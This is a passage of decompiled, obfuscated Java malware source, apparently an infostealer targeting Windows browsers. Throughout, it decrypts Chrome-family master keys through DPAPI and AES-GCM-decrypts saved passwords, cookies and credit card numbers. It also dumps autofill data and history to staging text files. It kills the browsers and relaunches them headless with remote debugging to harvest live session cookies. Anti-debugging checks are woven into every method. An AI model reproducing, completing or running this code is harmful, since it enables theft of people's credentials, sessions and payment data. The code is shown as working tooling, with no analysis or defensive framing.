               JSONObject var9 = new JSONObject(var8);
               byte[] var10 = java.util.Base64.getDecoder().decode(var9.getJSONObject("os_crypt")
                     .getString("encrypted_key"));
               byte[] var11 = new byte[var10.length - 5];
               System.arraycopy(var10, 5, var11, 0, var11.length);
               byte[] var12 = cerlsf(var11);
               ArrayList var13 = new java.util.ArrayList();
               var7 = wfrkmv(
                  new StringBuilder().append(var1).append("\\").append(var6).append("\\Web Data").toString(),
                  new java.util.Properties()
               );
               Statement var14 = var7.createStatement();
               ResultSet var15 = var14.executeQuery("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards");

               while (var15.next()) {
                  byte[] var16 = var15.getBytes("card_number_encrypted");
                  if (var16 != null && var16.length >= 16) {
                     String var17;
                     if (var16[0] == 118 && var16[1] >= 48 && var16[1] <= 57) {
                        var17 = jewpbo(var16, var12);
                     } else {
                        try {
                           var17 = new String(cerlsf(var16), java.nio.charset.StandardCharsets.UTF_8);
                        } catch (Throwable var36) {
                           var17 = null;
                        }
                     }

                     if (var17 != null
                        && !var17.trim().isEmpty()) {
                        String var18 = var15.getString("name_on_card");
                        int var19 = var15.getInt("expiration_month");
                        int var20 = var15.getInt("expiration_year");
                        var13.add(hwefggxaqr.eqbybn<"stallion","oipooghi-knpdpbhh-oflamdgn-papgpoho-maokpjhf-ogpkocbj-pgpamdgn-papgpoho-iclhljff-oipooghi-knpdpbhh-oflamdgn-papgpoho-lj",428908418,1>(
                              hwefggxaqr.eqbybn<"herald","mkleohhf-ipljpahk-mhpkmcga-nclmpphd-ockapihi-melaodbe-mbkfobhb-molbjbdm-omlppagc-mbpkpnhf-molcloeh-nekhpihk-mhoolifi-mkleohhf-ipljpahk-mhpkmcga-nclmpphd-ockapihi-melaodcp",345101728,1>(
                                 hwefggxaqr.eqbybn<"pepper","lbnpjlgj-pencimgg-lmjblohm-kjnhidgp-jjmliege-lpnljpai-lkmojngn-lfnkonca-jhneimho-lkjbibgj-lfnjmcfl-kpmmiegg-lmifmeee-lbnpjlgj-pencimgg-lmjblohm-kjnhidgp-jjmliege-lpnljpdd",149798619,1>(
                                    hwefggxaqr.eqbybn<"nectar","mejjoigo-ibjeppgb-mjnhmnhl-nmjbpagi-ominphgd-mkjnomap-mpiioogk-majmjoch-ocjcpphj-mpnhpcgo-majplbfm-nkikphgb-mjmdlhed-mejjoigo-ibjeppgb-mjnhmnhl-nmjbpagi-ominphgd-mkjnomde",262076590,1>(
                                          new StringBuilder().append(var18 != null
                                                         && !var18.isEmpty()
                                                      ? var18
                                                      : "-").append(" | ").append(var19 > 0
                                                ? String.format("%02d", new Object[]{
                                                      Integer.valueOf(var19)
                                                   })
                                                : "--").append("/"
                                       ),
                                       var20 > 0
                                          ? hwefggxaqr.eqbybn<"pattern", "nkiogkgm-jpidhngd-nhmaephj-mcighcgk-lajjhngb-mfikfdgl-lamhffce-pmifhnhl-nbmahagm-noiiddfo-mejnhfgd-nhne", 220000176, 0>(
                                             var20
                                          )
                                          : "----"),
                                    " | "
                                 ), var17.trim()
                              )
                           ));
                     }
                  }
               }

               var14.close();
               if (!var13.isEmpty()) {
                  File var40 = new File(var2, new StringBuilder().append(var3).append("_").append(var6).append(".txt").toString());
                  BufferedWriter var41 = new java.io.BufferedWriter(new java.io.FileWriter(var40, false));

                  try {
                     Iterator var42 = var13.iterator();

                     while (var42.hasNext()) {
                        String var43 = (String)var42.next();
                        var41.write(var43);
                        var41.newLine();
                     }
                  } catch (Throwable var37) {
                     try {
                        var41.close();
                     } catch (Throwable var34) {
                        var37.addSuppressed(var34);
                     }

                     throw var37;
                  }

                  var41.close();
                  var31 = false;
               } else {
                  var31 = false;
               }
               break label211;
            } catch (Throwable var38) {
               var31 = false;
            } finally {
               if (var31) {
                  if (var7 != null) {
                     try {
                        var7.close();
                     } catch (Throwable var32) {
                     }
                  }
               }
            }

            if (var7 != null) {
               try {
                  var7.close();
               } catch (Throwable var33) {
               }
            }
            continue;
         }

         if (var7 != null) {
            try {
               var7.close();
            } catch (Throwable var35) {
            }
         }
      }
   }

   public static void tncatl() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (impala) {
         if (!sloth.toFile().exists()) {
            sloth.toFile().mkdir();
         }

         String var0 = new StringBuilder().append(System.getenv("ProgramFiles")).append("\\Google\\Chrome\\Application\\chrome.exe").toString();
         String var1 = new StringBuilder().append(System.getenv("ProgramFiles(x86)")).append("\\Microsoft\\Edge\\Application\\msedge.exe").toString();
         String var2 = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\Application\\browser.exe").toString();
         String var3 = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\Application\\vivaldi.exe").toString();
         String var4 = new StringBuilder().append(System.getenv("ProgramFiles")).append("\\BraveSoftware\\Brave-Browser\\Application\\brave.exe").toString();
         String var5 = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Programs\\Opera GX\\opera.exe").toString();
         String var6 = new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Programs\\Opera\\opera.exe").toString();

         try {
            if (new File(var0).exists()
               && nugget) {
               jyngre(
                  new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Google\\Chrome\\User Data").toString(),
                  sloth,
                  "Chrome"
               );
            }

            if (new File(var1).exists()
               && grape) {
               jyngre(
                  new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\Edge\\User Data").toString(),
                  sloth,
                  "Edge"
               );
            }

            if (new File(var2).exists()
               && sailor) {
               jyngre(
                  new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Yandex\\YandexBrowser\\User Data").toString(),
                  sloth,
                  "Yandex"
               );
            }

            if (new File(var3).exists()
               && crimson) {
               jyngre(
                  new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Vivaldi\\User Data").toString(),
                  sloth,
                  "Vivaldi"
               );
            }

            if (new File(var4).exists()
               && juniper) {
               jyngre(
                  new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\BraveSoftware\\Brave-Browser\\User Data").toString(),
                  sloth,
                  "Brave"
               );
            }

            if (new File(var5).exists()
               && bounty) {
               jyngre(
                  new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera GX Stable").toString(),
                  sloth,
                  "Opera GX"
               );
            }

            if (new File(var6).exists()
               && string) {
               jyngre(
                  new StringBuilder().append(System.getenv("APPDATA")).append("\\Opera Software\\Opera Stable").toString(),
                  sloth,
                  "Opera"
               );
            }
         } catch (Exception var8) {
         }
      }
   }

   public static void jyngre(String var0, Path var1, String var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Connection var3 = null;
      Statement var4 = null;
      List var5 = jnpdit(var0);
      if (var5.isEmpty()) {
         System.out.println("Error null profiles");
      } else {
         if (var5.size() == 1
            && var5.contains("Default")) {
         }

         Iterator var6 = var5.iterator();

         while (var6.hasNext()) {
            String var7 = (String)var6.next();

            try {
               String var8 = "temp_history.db";
               java.nio.file.Files.copy(java.nio.file.Paths.get(new StringBuilder().append(var0).append("\\").append(var7).append("\\History").toString(), new String[0]), java.nio.file.Paths.get(var8, new String[0]), new CopyOption[]{
                     java.nio.file.StandardCopyOption.REPLACE_EXISTING
                  });
               String var9 = new StringBuilder().append("jdbc:sqlite:").append(var8).toString();
               ArrayList var10 = new java.util.ArrayList();
               Properties var11 = new java.util.Properties();
               var3 = lavender.connect(var9, var11);
               var4 = var3.createStatement();
               String var12 = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC";
               ResultSet var13 = var4.executeQuery(var12);

               while (var13.next()) {
                  String var14 = var13.getString("url");
                  String var15 = var13.getString("title");
                  long var16 = var13.getLong("last_visit_time");
                  String var18 = ijqfhk(var16);
                  var10.add(new dune(var14, var15, var18));
               }

               if (var10 != null && !var10.isEmpty()) {
                  File var24 = new File(new StringBuilder().append(var1).append("\\").append(var2).append("_").append(var7.replace(" ", "_")).append(".txt").toString());
                  BufferedWriter var25 = new java.io.BufferedWriter(new java.io.FileWriter(var24, false));

                  try {
                     Iterator var26 = var10.iterator();

                     while (var26.hasNext()) {
                        dune var17 = (dune)var26.next();
                        var25.write(var17.toString());
                        var25.newLine();
                     }

                     var25.close();
                  } catch (Throwable var20) {
                     try {
                        var25.close();
                     } catch (Throwable var19) {
                        var20.addSuppressed(var19);
                     }

                     throw var20;
                  }

                  var25.close();
               }

               var13.close();
               var4.close();
               var3.close();
               System.out.println(new StringBuilder().append("Save History: ").append(var1).toString());
               java.nio.file.Files.delete(java.nio.file.Paths.get(var8, new String[0]));
            } catch (Exception var21) {
               var21.printStackTrace();
            }
         }
      }
   }

   private static String ijqfhk(long var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == 0L) {
         return "Unknown";
      }

      long var2 = var0 / 1000 - 11644473600000L;
      LocalDateTime var4 = java.time.Instant.ofEpochMilli(var2).atZone(java.time.ZoneId.systemDefault()).toLocalDateTime();
      return var4.format(java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
   }

   private static void btmokd(String var0, String var1, String var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         ArrayList var4 = new java.util.ArrayList();
         if (lavender == null) {
            throw new java.lang.AssertionError();
         }

         Properties var5 = new java.util.Properties();
         Connection var6 = wfrkmv(
            new StringBuilder().append(var1).append("\\Web Data").toString(),
            var5
         );

         try {
            Statement var7 = var6.createStatement();

            try {
               ResultSet var8 = var7.executeQuery("SELECT name, value FROM autofill");

               while (var8.next()) {
                  String var9 = var8.getString("name");
                  String var10 = var8.getString("value");
                  var4.add(new lunar(var9, var10));
               }

               if (var4 != null && !var4.isEmpty()) {
                  File var21 = new File(var2, new StringBuilder().append(var3).append(".txt").toString());
                  BufferedWriter var22 = new java.io.BufferedWriter(new java.io.FileWriter(var21, false));

                  try {
                     Iterator var11 = var4.iterator();

                     while (var11.hasNext()) {
                        lunar var12 = (lunar)var11.next();
                        var22.write(var12.toString());
                        var22.newLine();
                     }
                  } catch (Throwable var16) {
                     try {
                        var22.close();
                     } catch (Throwable var15) {
                        var16.addSuppressed(var15);
                     }

                     throw var16;
                  }

                  var22.close();
               }

               if (var7 != null) {
                  var7.close();
               }

               if (var6 != null) {
                  var6.close();
               }
            } catch (Throwable var17) {
               if (var7 != null) {
                  try {
                     var7.close();
                  } catch (Throwable var14) {
                     var17.addSuppressed(var14);
                  }
               }

               throw var17;
            }
         } catch (Throwable var18) {
            if (var6 != null) {
               try {
                  var6.close();
               } catch (Throwable var13) {
                  var18.addSuppressed(var13);
               }
            }

            throw var18;
         }
      } catch (IOException | SQLException var19) {
      } catch (JSONException var20) {
      }
   }

   private static void trbsyi(String var0, String var1, String var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      List var4 = jnpdit(var1);
      if (var4.isEmpty()) {
         System.out.println("Error null profiles");
      } else {
         if (var4.size() == 1
            && var4.contains("Default")) {
         }

         Iterator var5 = var4.iterator();

         while (var5.hasNext()) {
            String var6 = (String)var5.next();

            try {
               String var7 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(var0, new String[0])));
               JSONObject var8 = new JSONObject(var7);
               String var9 = var8.getJSONObject("os_crypt")
                  .getString("encrypted_key");
               byte[] var10 = java.util.Base64.getDecoder().decode(var9);
               byte[] var11 = new byte[var10.length - 5];
               System.arraycopy(var10, 5, var11, 0, var10.length - 5);
               ArrayList var12 = new java.util.ArrayList();
               if (lavender == null) {
                  throw new java.lang.AssertionError();
               }

               Properties var13 = new java.util.Properties();
               Connection var14 = wfrkmv(
                  new StringBuilder().append(var1).append("\\").append(var6).append("\\Web Data").toString(),
                  var13
               );

               try {
                  Statement var15 = var14.createStatement();

                  try {
                     ResultSet var16 = var15.executeQuery("SELECT name, value FROM autofill");

                     while (var16.next()) {
                        String var17 = var16.getString("name");
                        String var18 = var16.getString("value");
                        var12.add(new lunar(var17, var18));
                     }

                     if (var12 != null && !var12.isEmpty()) {
                        File var29 = new File(var2, new StringBuilder().append(var3).append("_").append(var6).append(".txt").toString());
                        BufferedWriter var30 = new java.io.BufferedWriter(new java.io.FileWriter(var29, false));

                        try {
                           Iterator var19 = var12.iterator();

                           while (var19.hasNext()) {
                              lunar var20 = (lunar)var19.next();
                              var30.write(var20.toString());
                              var30.newLine();
                           }
                        } catch (Throwable var24) {
                           try {
                              var30.close();
                           } catch (Throwable var23) {
                              var24.addSuppressed(var23);
                           }

                           throw var24;
                        }

                        var30.close();
                     }

                     if (var15 != null) {
                        var15.close();
                     }

                     if (var14 != null) {
                        var14.close();
                     }
                  } catch (Throwable var25) {
                     if (var15 != null) {
                        try {
                           var15.close();
                        } catch (Throwable var22) {
                           var25.addSuppressed(var22);
                        }
                     }

                     throw var25;
                  }
               } catch (Throwable var26) {
                  if (var14 != null) {
                     try {
                        var14.close();
                     } catch (Throwable var21) {
                        var26.addSuppressed(var21);
                     }
                  }

                  throw var26;
               }
            } catch (IOException | SQLException var27) {
            } catch (JSONException var28) {
            }
         }
      }
   }

   private static byte[] cerlsf(byte[] var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      DATA_BLOB var1 = new DATA_BLOB(var0);
      DATA_BLOB var2 = new DATA_BLOB();
      if (!Crypt32.INSTANCE.CryptUnprotectData(var1, null, null, null, null, 0, var2)) {
         throw new Win32Exception(Native.getLastError());
      }

      byte[] var3 = var2.getData();
      var2.pbData.clear(var2.cbData);
      return var3;
   }

   public static void amaprf() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (silo) {
         if (!modern.toFile().exists()) {
            modern.toFile().mkdir();
         }

         System.out.println(modern);

         try {
            if (stealth.exists() && rustic) {
               zcfjqm(jungle, coffee, modern, "Chrome");
            }

            if (pulley.exists() && jasper) {
               zcfjqm(hamlet, shrub, modern, "Opera");
            }

            if (pumpkin.exists() && lyric) {
               aghsok(cedar, ledger, modern, "OperaGX");
            }

            if (hermit.exists() && piranha) {
               zcfjqm(lagoon, bottle, modern, "Edge");
            }

            if (receipt.exists() && mailman) {
               zcfjqm(rosemary, mandala, modern, "Brave");
            }

            if (dolphin.exists() && rabbit) {
               zcfjqm(pancake, puffin, modern, "Vivaldi");
            }

            if (rook.exists() && breeze) {
               zcfjqm(castle, motif, modern, "Yandex");
            }
         } catch (Exception var1) {
         }
      }
   }

   private static void aghsok(String var0, String var1, Path var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Connection var4 = null;
      Statement var5 = null;

      try {
         String var6 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(var0, new String[0])));
         JSONObject var7 = new JSONObject(var6);
         String var8 = var7.getJSONObject("os_crypt")
            .getString("encrypted_key");
         byte[] var9 = java.util.Base64.getDecoder().decode(var8);
         final byte[] var10 = new byte[var9.length - 5];
         System.arraycopy(var9, 5, var10, 0, var9.length - 5);
         byte[] var11 = cradle.desert(
            "Win32CryptUnprotectData",
            new Callable<byte[]>() {
               public byte[] call() throws Exception {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  return prawn.fldvhk(var10);
               }
            }
         );
         ArrayList var12 = new java.util.ArrayList();
         if (lavender == null) {
            throw new java.lang.AssertionError();
         }

         Properties var13 = new java.util.Properties();

         try {
            var4 = lavender.connect(new StringBuilder().append("jdbc:sqlite:").append(var1).append("\\Network\\Cookies").toString(), var13);

            try {
               var5 = var4.createStatement();
            } catch (Throwable var27) {
               if (var4 != null) {
                  try {
                     var4.close();
                  } catch (Throwable var24) {
                     var27.addSuppressed(var24);
                  }
               }

               throw var27;
            }
         } catch (Exception var28) {
         }

         try {
            try {
               ResultSet var14 = var5.executeQuery("SELECT host_key, name, path, is_secure, expires_utc, encrypted_value FROM cookies");

               while (var14.next()) {
                  String var15 = var14.getString("host_key");
                  String var16 = var14.getString("name");
                  String var17 = var14.getString("path");
                  boolean var18 = var14.getInt("is_secure")
                     != 0;
                  long var19 = var14.getLong("expires_utc");
                  byte[] var21 = var14.getBytes("encrypted_value");
                  String var22 = jewpbo(var21, var11);
                  if (var22 != null) {
                     var12.add(new pastel(var15, var16, var17, var18, var19, var22));
                  }
               }

               if (var12.size() > 3) {
                  BufferedWriter var30 = new java.io.BufferedWriter(new java.io.FileWriter(new StringBuilder().append(var2).append("\\[OLD Cookies] ").append(var3).append(".txt").toString()));
                  Iterator var31 = var12.iterator();

                  while (var31.hasNext()) {
                     pastel var32 = (pastel)var31.next();
                     var30.write(var32.toString());
                     var30.newLine();
                  }

                  var30.close();
               }

               if (var5 != null) {
                  var5.close();
               }

               if (var4 != null) {
                  var4.close();
               }
            } catch (Throwable var25) {
               throw var25;
            }
         } catch (Throwable var26) {
            if (var5 != null) {
               try {
                  var5.close();
               } catch (Throwable var23) {
                  var26.addSuppressed(var23);
               }
            }

            throw var26;
         }
      } catch (Exception var29) {
      }
   }

   public static void zcfjqm(String var0, String var1, Path var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Connection var4 = null;
      Statement var5 = null;
      List var6 = jnpdit(var1);
      if (var6.isEmpty()) {
         System.out.println("Error null profiles");
         System.out.println(new StringBuilder().append("Error in: ").append(var1).toString());
         File[] var34 = new File(var1).listFiles();
         if (var34 != null) {
            for (File var38 : var34) {
               if (var38.isDirectory()) {
                  System.out.println(var38.getName());
               }
            }
         }
      } else {
         if (var6.size() == 1
            && var6.contains("Default")) {
         }

         Iterator var7 = var6.iterator();

         while (var7.hasNext()) {
            String var8 = (String)var7.next();

            try {
               String var9 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(var0, new String[0])));
               JSONObject var10 = new JSONObject(var9);
               String var11 = var10.getJSONObject("os_crypt")
                  .getString("encrypted_key");
               byte[] var12 = java.util.Base64.getDecoder().decode(var11);
               final byte[] var13 = new byte[var12.length - 5];
               System.arraycopy(var12, 5, var13, 0, var12.length - 5);
               byte[] var14 = cradle.desert(
                  "Win32CryptUnprotectData",
                  new Callable<byte[]>() {
                     public byte[] call() throws Exception {
                        if (rkjsezrwcf.jzdety() != 0) {
                           rkjsezrwcf.bbsnvj();
                        }

                        return prawn.fldvhk(var13);
                     }
                  }
               );
               ArrayList var15 = new java.util.ArrayList();
               if (lavender == null) {
                  throw new java.lang.AssertionError();
               }

               Properties var16 = new java.util.Properties();

               try {
                  var4 = lavender.connect(new StringBuilder().append("jdbc:sqlite:").append(var1).append("\\").append(var8).append("\\Network\\Cookies").toString(), var16);
                  System.out.println(new StringBuilder().append(var1).append("\\").append(var8).append("\\Network\\Cookies").toString());

                  try {
                     var5 = var4.createStatement();
                  } catch (Throwable var28) {
                     if (var4 != null) {
                        try {
                           var4.close();
                        } catch (Throwable var27) {
                           var28.addSuppressed(var27);
                        }
                     }

                     throw var28;
                  }
               } catch (Exception var29) {
               }

               try {
                  try {
                     ResultSet var17 = var5.executeQuery("SELECT host_key, name, path, is_secure, expires_utc, encrypted_value FROM cookies");

                     while (var17.next()) {
                        String var18 = var17.getString("host_key");
                        String var19 = var17.getString("name");
                        String var20 = var17.getString("path");
                        boolean var21 = var17.getInt("is_secure")
                           != 0;
                        long var22 = var17.getLong("expires_utc");
                        byte[] var24 = var17.getBytes("encrypted_value");
                        String var25 = jewpbo(var24, var14);
                        if (var25 != null) {
                           var15.add(new pastel(var18, var19, var20, var21, var22, var25));
                        }
                     }

                     BufferedWriter var39 = null;
                     if (var15.size() > 3) {
                        try {
                           var39 = new java.io.BufferedWriter(new java.io.FileWriter(new StringBuilder().append(var2).append("\\[OLD Cookies] ").append(var3).append("_").append(var8.replace(" ", "_")).append(".txt").toString()));
                           Iterator var40 = var15.iterator();

                           while (var40.hasNext()) {
                              pastel var41 = (pastel)var40.next();
                              var39.write(var41.toString());
                              var39.newLine();
                           }

                           var39.close();
                           if (var5 != null) {
                              var5.close();
                           }

                           if (var4 != null) {
                              var4.close();
                           }
                        } catch (Exception var30) {
                           var30.printStackTrace();
                           var39.close();
                        }
                     }
                  } catch (Throwable var31) {
                     throw var31;
                  }
               } catch (Throwable var32) {
                  if (var5 != null) {
                     try {
                        var5.close();
                     } catch (Throwable var26) {
                        var32.addSuppressed(var26);
                     }
                  }

                  throw var32;
               }
            } catch (Exception var33) {
            }
         }
      }
   }

   private static String jewpbo(byte[] var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0.length < 15) {
         return null;
      }

      try {
         byte[] var2 = new byte[12];
         byte[] var3 = new byte[var0.length - 15];
         System.arraycopy(var0, 3, var2, 0, 12);
         System.arraycopy(var0, 15, var3, 0, var3.length);
         Cipher var4 = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec var5 = new javax.crypto.spec.GCMParameterSpec(128, var2);
         SecretKeySpec var6 = new javax.crypto.spec.SecretKeySpec(var1, "AES");
         var4.init(2, var6, var5);
         return new String(var4.doFinal(var3));
      } catch (Exception var7) {
         return null;
      }
   }

   public static void tklotp() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (geyser) {
         try {
            String var0 = new StringBuilder().append(lantern).append("\\Passwords").toString();
            if (!new File(new StringBuilder().append(lantern).append("\\Passwords").toString()).exists()) {
               try {
                  new File(new StringBuilder().append(lantern).append("\\Passwords").toString()).mkdirs();
               } catch (Exception var2) {
               }
            }

            if (mimic.exists() && scarf) {
               shquuf(nectar, satchel, var0, "Chrome");
            }

            if (mantis.exists() && omelet) {
               shquuf(shrimp, rapids, var0, "Opera");
            }

            if (carpet.exists() && pixel) {
               shquuf(plato, fossil, var0, "OperaGX");
            }

            if (bullet.exists() && cougar) {
               shquuf(harbor, pelican, var0, "Edge");
            }

            if (olive.exists() && metro) {
               shquuf(rosin, squid, var0, "Brave");
            }

            if (helmet.exists() && skillet) {
               shquuf(mitten, ladder, var0, "Vivaldi");
            }
         } catch (Exception var3) {
         }
      }
   }

   private static void shquuf(String var0, String var1, String var2, String var3) throws SQLException, GeneralSecurityException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Connection var4 = null;

      try {
         ArrayList var5 = new java.util.ArrayList();
         String var6 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(var0, new String[0])));
         JSONObject var7 = new JSONObject(var6);
         String var8 = var7.getJSONObject("os_crypt")
            .getString("encrypted_key");
         byte[] var9 = java.util.Base64.getDecoder().decode(var8);
         final byte[] var10 = new byte[var9.length - 5];
         System.arraycopy(var9, 5, var10, 0, var9.length - 5);
         byte[] var11 = cradle.desert(
            "Win32CryptUnprotectData",
            new Callable<byte[]>() {
               public byte[] call() throws Exception {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  return prawn.fldvhk(var10);
               }
            }
         );
         if (lavender == null) {
            throw new java.lang.AssertionError();
         }

         ArrayList var12 = new java.util.ArrayList();
         Properties var13 = new java.util.Properties();

         try {
            var4 = lavender.connect(new StringBuilder().append("jdbc:sqlite:").append(var1).toString(), var13);
         } catch (Exception var23) {
         }

         try {
            Statement var14 = var4.createStatement();

            try {
               ResultSet var15 = var14.executeQuery("SELECT origin_url, username_value, password_value FROM logins");

               while (var15.next()) {
                  String var16 = var15.getString("origin_url");
                  String var17 = var15.getString("username_value");
                  byte[] var18 = var15.getBytes("password_value");
                  String var19 = mieysm(var18, var11);
                  if (!var17.isEmpty()
                     && !var19.isEmpty()) {
                     var12.add(new pagoda(var16, var17, var19));
                  }
               }

               if (var12 != null && !var12.isEmpty()) {
                  File var29 = new File(var2, new StringBuilder().append("[OLD] ").append(var3).append(".txt").toString());
                  BufferedWriter var30 = new java.io.BufferedWriter(new java.io.FileWriter(var29, false));

                  try {
                     Iterator var31 = var12.iterator();

                     while (var31.hasNext()) {
                        pagoda var32 = (pagoda)var31.next();
                        var30.write(var32.toString());
                        var30.newLine();
                     }
                  } catch (Throwable var24) {
                     try {
                        var30.close();
                     } catch (Throwable var22) {
                        var24.addSuppressed(var22);
                     }

                     throw var24;
                  }

                  var30.close();
               }

               if (var14 != null) {
                  var14.close();
               }

               if (var4 != null) {
                  var4.close();
               }
            } catch (Exception var25) {
               if (var14 != null) {
                  try {
                     var14.close();
                  } catch (Throwable var21) {
                     var25.addSuppressed(var21);
                  }
               }

               throw var25;
            }
         } catch (Throwable var26) {
            if (var4 != null) {
               try {
                  var4.close();
               } catch (Throwable var20) {
                  var26.addSuppressed(var20);
               }
            }

            throw var26;
         }
      } catch (IOException var27) {
      } catch (Exception var28) {
      }
   }

   private static String mieysm(byte[] var0, byte[] var1) throws GeneralSecurityException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte[] var2 = new byte[12];
      byte[] var3 = new byte[var0.length - 15];
      System.arraycopy(var0, 3, var2, 0, 12);
      System.arraycopy(var0, 15, var3, 0, var3.length);
      Cipher var4 = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
      GCMParameterSpec var5 = new javax.crypto.spec.GCMParameterSpec(128, var2);
      SecretKeySpec var6 = new javax.crypto.spec.SecretKeySpec(var1, "AES");
      var4.init(2, var6, var5);
      return new String(var4.doFinal(var3));
   }

   public static List<String> jnpdit(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var1 = new java.util.ArrayList();
      File var2 = new File(var0);
      if (var2.exists()
         && var2.isDirectory()) {
         File[] var3 = var2.listFiles();
         if (var3 != null) {
            for (File var7 : var3) {
               if (var7.isDirectory()
                  && var7.getName().startsWith("Profile")) {
                  var1.add(var7.getName());
               }
            }

            File var8 = new File(new StringBuilder().append(var0).append("\\Default").toString());
            if (var8.exists()
               && var8.isDirectory()) {
               var1.add("Default");
            }
         }

         return var1;
      } else {
         System.out.println(new StringBuilder().append("\u041f\u0430\u043f\u043a\u0430 User Data ").append(var0).toString());
         return var1;
      }
   }

   public static void dfzvsd(String var0, String var1, String var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         List var4 = jnpdit(var1);
         if (var4.isEmpty()) {
            System.out.println("Error null profiles");
            System.out.println(new StringBuilder().append("Error in: ").append(var1).toString());
            File[] var5 = new File(var1).listFiles();
            if (var5 != null) {
               for (File var9 : var5) {
                  if (var9.isDirectory()) {
                     System.out.println(var9.getName());
                  }
               }
            }
         } else {
            boolean var16 = false;
            if (var4.size() == 1
               && var4.contains("Default")) {
               var16 = true;
            }

            Iterator var17 = var4.iterator();

            while (var17.hasNext()) {
               String var18 = (String)var17.next();
               System.out.println(new StringBuilder().append(var18).append(" ").append(var3).toString());
               String var19 = new StringBuilder().append("TASKKILL /F /IM ").append(var0.substring(var0.lastIndexOf("\\")
                           + 1)).toString();

               try {
                  Runtime.getRuntime().exec(var19).waitFor();
                  Thread.sleep(300);
                  opfkqo(var0, var1, var18, var16, var3);

                  try {
                     Thread.sleep(300);
                     String var20 = bitnvi(
                        "http://localhost:9222/json"
                     );
                     if (!var20.isEmpty()) {
                        try {
                           nnjyzh(
                              var20,
                              new StringBuilder().append(var2).append("\\[NEW Cookies] ").append(var3).append("_").append(var18.replace(" ", "_")).append(".txt").toString()
                           );
                        } catch (Exception var12) {
                           var12.printStackTrace();
                        }
                     }

                     try {
                        Runtime.getRuntime().exec(var19).waitFor();
                     } catch (Exception var11) {
                        var11.printStackTrace();
                     }
                  } catch (InterruptedException var13) {
                     var13.printStackTrace();
                  }
               } catch (Exception var14) {
                  var14.printStackTrace();
               }
            }
         }
      } catch (Exception var15) {
         var15.printStackTrace();
      }
   }

   public static void ofbmnw(String var0, String var1, String var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var4 = new StringBuilder().append("TASKKILL /F /IM ").append(var0.substring(var0.lastIndexOf("\\")
                  + 1)).toString();

      try {
         Runtime.getRuntime().exec(var4).waitFor();
         Thread.sleep(300);
         opfkqo(var0, var1, "profile", true, var3);

         try {
            Thread.sleep(300);
            String var5 = bitnvi(
               "http://localhost:9222/json"
            );
            if (!var5.isEmpty()) {
               try {
                  nnjyzh(
                     var5,
                     new StringBuilder().append(var2).append("\\[NEW Cookies] ").append(var3).append(".txt").toString()
                  );
               } catch (Exception var8) {
                  var8.printStackTrace();
               }
            }

            try {
               Runtime.getRuntime().exec(var4).waitFor();
            } catch (IOException var7) {
               var7.printStackTrace();
            }
         } catch (InterruptedException var9) {
            var9.printStackTrace();
         }
      } catch (Exception var10) {
         var10.printStackTrace();
      }
   }

   private static void opfkqo(String var0, String var1, String var2, boolean var3, String var4) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         if (var3) {
            new ProcessBuilder(new String[]{
                        var0,
                        "--restore-last-session",
                        "--remote-debugging-port=9222",
                        "--headless",
                        "--remote-allow-origins=*",
                        new StringBuilder().append("--user-data-dir=").append(var1).toString()
                     }).redirectErrorStream(true).start();
         } else {
            new ProcessBuilder(new String[]{
                        var0,
                        "--restore-last-session",
                        "--remote-debugging-port=9222",
                        "--headless",
                        "--remote-allow-origins=*",
                        new StringBuilder().append("--user-data-dir=").append(var1).toString(),
